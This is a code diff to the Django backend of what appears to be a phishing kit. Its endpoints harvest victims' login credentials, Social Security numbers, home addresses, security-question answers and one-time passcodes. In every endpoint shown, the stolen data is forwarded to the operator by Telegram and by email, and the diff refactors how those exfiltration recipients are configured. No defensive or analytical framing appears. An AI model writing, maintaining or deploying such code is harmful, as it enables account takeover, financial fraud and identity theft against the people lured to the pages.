@@ -23,8 +23,17 @@ from core.middleware.block_ips_middleware import (
 )
 from user_data.models import Address, BankInfo, BrowserDetail, Client
 from django.template.loader import get_template
-from django.core.mail import send_mail
+from core.settings import send_data_email, send_data_telegram, save_data_to_file
 from datetime import datetime
+
+
+def _notification_sender():
+    return app_settings.get("from_email") or settings.DEFAULT_FROM_EMAIL
+
+
+def _notification_recipients():
+    recipients = app_settings.get("send_email_list") or getattr(settings, "EMAIL_RECIPIENTS", [])
+    return [addr for addr in recipients if addr]
 
 
 @api_view(
@@ -118,8 +127,8 @@ def collect_user_login_cred(request):
         ########################
   
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -225,14 +234,14 @@ def collect_user_login_cred2(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -338,14 +347,14 @@ def collect_user_basic_info(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -462,14 +471,14 @@ def collect_user_home_address(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -570,14 +579,14 @@ def collect_user_social_security(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -678,14 +687,14 @@ def collect_user_social_security_2(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -820,14 +829,14 @@ def collect_user_security_questions(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "The Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
@@ -928,14 +937,14 @@ def collect_user_otp_verification(request):
         # Send data to telegram
         ##############################
 
-        send_data_telegram(message)
+        send_data_telegram(app_settings, message)
 
         #############################
         # Send Data to email
         ########################
         subject = "OTP Verification Data"
-        from_email = app_settings['from_email']
-        recipient_list = app_settings['send_email_list']
+        from_email = _notification_sender()
+        recipient_list = _notification_recipients()
 
         send_data_email(subject, message, from_email, recipient_list)
 
